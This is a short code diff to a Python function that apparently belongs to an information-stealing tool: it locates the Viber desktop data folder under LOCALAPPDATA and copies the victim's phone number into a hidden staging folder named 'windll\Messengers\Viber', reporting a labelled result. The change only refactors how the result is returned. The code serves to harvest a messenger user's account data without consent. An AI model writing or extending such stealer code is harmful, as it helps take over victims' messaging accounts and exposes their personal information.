@@ -15,7 +15,8 @@ from shutil import copy2
 from manager.logger import Log
 
 
-def Viber(data):
+def Viber():
+        msgInfo = ""
         try:
             path = 'ViberPC'   
             local = getenv('LOCALAPPDATA')
@@ -28,8 +29,8 @@ def Viber(data):
                     with open(rf"{local}\windll\Messengers\Viber\phoneNumber.txt", "a", encoding="utf-8") as num:
                         num.write("+"+filename)
                     num.close()
-            data.append("\n∟📨Viber")
-            return data
+            msgInfo+="\n∟📨Viber"
+            return msgInfo
         except Exception as e:
             Log(f"Viber ---> {e}")
-            return data
+            return msgInfo
